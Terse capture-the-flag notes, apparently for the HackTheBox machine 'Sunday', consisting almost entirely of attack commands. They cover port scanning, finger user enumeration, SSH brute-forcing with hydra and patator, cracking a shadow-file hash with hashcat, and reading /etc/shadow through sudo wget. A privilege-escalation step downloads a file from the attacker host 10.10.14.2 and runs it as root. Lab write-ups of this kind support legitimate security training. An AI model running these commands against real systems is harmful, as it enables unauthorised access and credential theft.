
```
nmap -sC -sV -oA nmap/sunday 10.10.10.76
nmap -sC -sV -p 79,111,22022,35342 -oA nmap/sunday 10.10.10.76
nmap -p- -oA allports.nmap 10.10.10.76 --max-retries 1
```
* 枚举
``` 
msfdb run 
> https://github.com/pentestmonkey/finger-user-enum
search finger
use ../finger_users
show options
set RHOSTS 10.10.10.76
run
```
``` 
cd finger-user-enum/
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
cat finger.output
```
* 登录
``` 
ssh -p 22022 sunny@10.10.10.76 
ssh -okexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76 
hydra -l sunny -p sunday ssh://10.10.10.76:22022
patator ssh login host=10.10.10.76 port=22022 password=FILE 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 
            user=sunny
            -x ignore:mesg="Authentication failed."
```
* 进入 破解ssh密码
``` 
cd /backup
ls -la
cat shadow.backup

ssh kracken
cd hashcat
vi hashes/sunny
    > ssh 密码指纹
./hashcat -m 7400 hashes/sunny /opt/wordlist/rockyou.txt
```
 
* 进入sunny
``` 
sudo wget -i /etc/shadow 2>&1 | awk `{print $4}`

1. 目标机ssh 1
sleep 5; sudo  wget 10.10.14.2:8000/troll -O /root/troll
2. 目标机ssh 2
sudo /root/troll
3. 本机
python -m SimpleHTTPServer  
```

* 提权
